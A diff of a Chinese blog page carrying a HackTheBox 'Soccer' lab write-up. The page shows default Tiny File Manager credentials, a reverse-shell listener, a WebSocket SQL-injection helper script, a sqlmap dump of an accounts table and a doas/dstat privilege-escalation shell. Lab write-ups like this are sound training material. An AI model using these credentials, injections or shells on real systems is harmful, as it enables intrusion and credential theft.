@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="HackTheBox">
+    <meta name="keywords" content="HackTheBox,Soccer">
     <meta name="description" content="HackTheBox-Soccer">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 6.0.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
 </head>
 
 
@@ -430,8 +430,24 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/HackTheBox/">
-                                <span class="chip bg-color">HackTheBox</span>
+                            <a href="/tags/Tiny-File-Manager%E5%BC%B1%E5%8F%A3%E4%BB%A4/">
+                                <span class="chip bg-color">Tiny File Manager弱口令</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
+                            </a>
+                        
+                            <a href="/tags/ngnix/">
+                                <span class="chip bg-color">ngnix</span>
+                            </a>
+                        
+                            <a href="/tags/WebSocket%E5%AE%9E%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">WebSocket实现SQL注入</span>
+                            </a>
+                        
+                            <a href="/tags/doas%E5%92%8Cdstat%E8%81%94%E5%8A%A8%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">doas和dstat联动提权</span>
                             </a>
                         
                     </div>
@@ -444,6 +460,10 @@
                         
                             <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                 靶机
+                            </a>
+                        
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
+                                HackTheBox
                             </a>
                         
                     </div>
@@ -462,21 +482,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-31
+                    2023-11-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.9k&nbsp;字
+                    2.3k&nbsp;字
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    15 分
+                    11 分
                 </div>
                 
 
@@ -504,7 +524,13 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HTB-Soccer"><a href="#HTB-Soccer" class="headerlink" title="HTB-Soccer"></a>HTB-Soccer</h1><p>话不多说，nmap一把梭</p>
+                <h1 id="HTB-Soccer"><a href="#HTB-Soccer" class="headerlink" title="HTB-Soccer"></a>HTB-Soccer</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.目录扫描发现子目录存在Tiny File Manager弱口令；</p>
+<p>2.弱口令登录后文件上传反弹shell获取www-data权限；</p>
+<p>3.ngnix配置文件信息泄露发现soc-player子域；</p>
+<p>4.soc-player子域页面源码发现使用了WebSocket；</p>
+<p>5.WebSocket实现SQL注入获取ssh账户；</p>
+<p>6.doas和dstat联动提权</p>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>话不多说，nmap一把梭</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sC -sV 10.10.11.194<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
@@ -525,97 +551,13 @@ PORT     STATE SERVICE         VERSION
 9091/tcp open  xmltec-xmlmail?
 | fingerprint-strings: 
 |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
-|     HTTP/1.1 400 Bad Request
-|     Connection: close
-|   GetRequest: 
-|     HTTP/1.1 404 Not Found
-|     Content-Security-Policy: default-src 'none'
-|     X-Content-Type-Options: nosniff
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 139
-|     Date: Mon, 06 Feb 2023 09:01:48 GMT
-|     Connection: close
-|     &lt;!DOCTYPE html&gt;
-|     &lt;html lang="en"&gt;
-|     &lt;head&gt;
-|     &lt;meta charset="utf-8"&gt;
-|     &lt;title&gt;Error&lt;/title&gt;
-|     &lt;/head&gt;
-|     &lt;body&gt;
-|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   HTTPOptions: 
-|     HTTP/1.1 404 Not Found
-|     Content-Security-Policy: default-src 'none'
-|     X-Content-Type-Options: nosniff
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 143
-|     Date: Mon, 06 Feb 2023 09:01:49 GMT
-|     Connection: close
-|     &lt;!DOCTYPE html&gt;
-|     &lt;html lang="en"&gt;
-|     &lt;head&gt;
-|     &lt;meta charset="utf-8"&gt;
-|     &lt;title&gt;Error&lt;/title&gt;
-|     &lt;/head&gt;
-|     &lt;body&gt;
-|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   RTSPRequest: 
-|     HTTP/1.1 404 Not Found
-|     Content-Security-Policy: default-src 'none'
-|     X-Content-Type-Options: nosniff
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 143
-|     Date: Mon, 06 Feb 2023 09:01:50 GMT
-|     Connection: close
-|     &lt;!DOCTYPE html&gt;
-|     &lt;html lang="en"&gt;
-|     &lt;head&gt;
-|     &lt;meta charset="utf-8"&gt;
-|     &lt;title&gt;Error&lt;/title&gt;
-|     &lt;/head&gt;
-|     &lt;body&gt;
-|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
-|     &lt;/body&gt;
-|_    &lt;/html&gt;
+......
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port9091-TCP:V=7.91%I=7%D=2/6%Time=63E0C1F6%P=x86_64-pc-linux-gnu%r(inf
-SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
-SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
-SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
-SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
-SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
-SF:tent-Length:\x20139\r\nDate:\x20Mon,\x2006\x20Feb\x202023\x2009:01:48\x
-SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=
-SF:\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/h
-SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(HTT
-SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
-SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
-SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
-SF:\nDate:\x20Mon,\x2006\x20Feb\x202023\x2009:01:49\x20GMT\r\nConnection:\
-SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;met
-SF:a\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca
-SF:nnot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RTSPRequest,16C,"HTT
-SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
-SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
-SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,\x
-SF:2006\x20Feb\x202023\x2009:01:50\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;
-SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"ut
-SF:f-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x
-SF:20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
-SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
-SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
-SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
-SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
-SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
-SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
+......
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>开放端口：22（SSH）、80（HTTP，ngnix服务器）、9091</p>
 <p>80端口HTTP服务域名为soccer.htb，将域名解析条目添加到hosts文件</p>
@@ -662,12 +604,12 @@ Progress: 20469 / 20470 (100.00%)
 <p>下方有个超链接：<a target="_blank" rel="noopener" href="https://tinyfilemanager.github.io/">—— © CCP Programmers ——</a>，打开一看，就是登录页面的标题。</p>
 <img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213095237007.png" style="zoom:67%;">
 
-<p>Github有默认用户名和密码</p>
+<h2 id="三、Tiny-File-Manager弱口令"><a href="#三、Tiny-File-Manager弱口令" class="headerlink" title="三、Tiny File Manager弱口令"></a>三、Tiny File Manager弱口令</h2><p>Github有默认用户名和密码</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">默认用户名/密码:
 admin/admin@123
 user/12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>用admin用户登录进来，浏览页面，有个上传点，那当然是试试能不能上传个反弹shell。试来试去，发现刚进来的主界面是/var/www/html目录，正常的www服务目录，上传的话只会上传到当前所在目录，而且只有tiny/uploads目录下可以上传成功。由于靶场环境会隔几分钟刷新，所以上传的文件留存不了太久，建议上传之前就开好监听</p>
+<h2 id="四、文件上传反弹shell"><a href="#四、文件上传反弹shell" class="headerlink" title="四、文件上传反弹shell"></a>四、文件上传反弹shell</h2><p>用admin用户登录进来，浏览页面，有个上传点，那当然是试试能不能上传个反弹shell。试来试去，发现刚进来的主界面是/var/www/html目录，正常的www服务目录，上传的话只会上传到当前所在目录，而且只有tiny/uploads目录下可以上传成功。由于靶场环境会隔几分钟刷新，所以上传的文件留存不了太久，建议上传之前就开好监听</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 3030	#端口改成自己脚本对应的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213095809172.png"></p>
@@ -800,7 +742,7 @@ user/12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 <p>此时我们先看home目录，看有哪些用户，然后发现/home/player目录下有个user.txt，但www-data用户无访问权限</p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213125411132.png"></p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213125607328.png"></p>
-<p>然后来看ngnix的配置文件，在/etc/nginx/sites-enabled发现子域名soc-player.soccer.htb，这子域名也可以在/etc/hosts发现</p>
+<h2 id="五、ngnix配置文件敏感信息泄露"><a href="#五、ngnix配置文件敏感信息泄露" class="headerlink" title="五、ngnix配置文件敏感信息泄露"></a>五、ngnix配置文件敏感信息泄露</h2><p>然后来看ngnix的配置文件，在/etc/nginx/sites-enabled发现子域名soc-player.soccer.htb，这子域名也可以在/etc/hosts发现</p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213153122893.png"></p>
 <p>再次添加域名解析条目进hosts文件，然后浏览器访问，如下可看到【Match】、【Login】、【Signup】字段</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.194 soc-player.soccer.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -816,7 +758,7 @@ user/12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155822282.png"></p>
 <p>查看源码，用了WebSocket</p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213160129163.png"></p>
-<p>这里搜寻了大佬的思路，参考：<a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a>，可以利用WebSocket，实施SQL注入。在任意位置新建以下脚本文件</p>
+<h2 id="六、WebSocket实现SQL注入"><a href="#六、WebSocket实现SQL注入" class="headerlink" title="六、WebSocket实现SQL注入"></a>六、WebSocket实现SQL注入</h2><p>这里搜寻了大佬的思路，参考：<a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a>，可以利用WebSocket，实施SQL注入。在任意位置新建以下脚本文件</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> SimpleHTTPRequestHandler
 <span class="token keyword">from</span> socketserver <span class="token keyword">import</span> TCPServer
 <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span> urlparse
@@ -896,7 +838,7 @@ sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump<span aria
 
 <p>然后SSH连上这个player用户</p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215095448809.png"></p>
-<p>接下来就是提权，我们用doas和dstat联动提权</p>
+<h2 id="七、doas和dstat联动提权"><a href="#七、doas和dstat联动提权" class="headerlink" title="七、doas和dstat联动提权"></a>七、doas和dstat联动提权</h2><p>接下来就是提权，我们用doas和dstat联动提权</p>
 <p><a target="_blank" rel="noopener" href="https://man.openbsd.org/doas">doas</a>：以其他用户身份执行命令，系统管理员可以对其进行设定，赋予指定使用者执行特定指令的权限。</p>
 <p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/dstat">dstat</a>：用于生成系统资源统计信息的多功能工具。</p>
 <p>关键点就在于用户可以给dstat添加查看系统资源的脚本文件，我们可以在脚本文件中利用socket来建立连接，从而获取shell。</p>
@@ -1003,8 +945,24 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/HackTheBox/">
-                                    <span class="chip bg-color">HackTheBox</span>
+                                <a href="/tags/Tiny-File-Manager%E5%BC%B1%E5%8F%A3%E4%BB%A4/">
+                                    <span class="chip bg-color">Tiny File Manager弱口令</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
+                                </a>
+                            
+                                <a href="/tags/ngnix/">
+                                    <span class="chip bg-color">ngnix</span>
+                                </a>
+                            
+                                <a href="/tags/WebSocket%E5%AE%9E%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">WebSocket实现SQL注入</span>
+                                </a>
+                            
+                                <a href="/tags/doas%E5%92%8Cdstat%E8%81%94%E5%8A%A8%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">doas和dstat联动提权</span>
                                 </a>
                             
                         </div>
@@ -1538,6 +1496,10 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                                     靶机
                                 </a>
                             
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
+                                    HackTheBox
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -1545,8 +1507,32 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HackTheBox/">
-                        <span class="chip bg-color">HackTheBox</span>
+                    <a href="/tags/LFI/">
+                        <span class="chip bg-color">LFI</span>
+                    </a>
+                    
+                    <a href="/tags/Nginx/">
+                        <span class="chip bg-color">Nginx</span>
+                    </a>
+                    
+                    <a href="/tags/JWT%E4%BC%AA%E9%80%A0/">
+                        <span class="chip bg-color">JWT伪造</span>
+                    </a>
+                    
+                    <a href="/tags/SSRF/">
+                        <span class="chip bg-color">SSRF</span>
+                    </a>
+                    
+                    <a href="/tags/awk%E5%91%BD%E4%BB%A4/">
+                        <span class="chip bg-color">awk命令</span>
+                    </a>
+                    
+                    <a href="/tags/sed%E5%91%BD%E4%BB%A4RCE/">
+                        <span class="chip bg-color">sed命令RCE</span>
+                    </a>
+                    
+                    <a href="/tags/mail%E5%91%BD%E4%BB%A4/">
+                        <span class="chip bg-color">mail命令</span>
                     </a>
                     
                 </div>
@@ -1782,7 +1768,7 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
             
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点文章总字数:&nbsp;<span
-                        class="white-color">62.4k&nbsp;字</span>
+                        class="white-color">61.4k&nbsp;字</span>
             
             
 
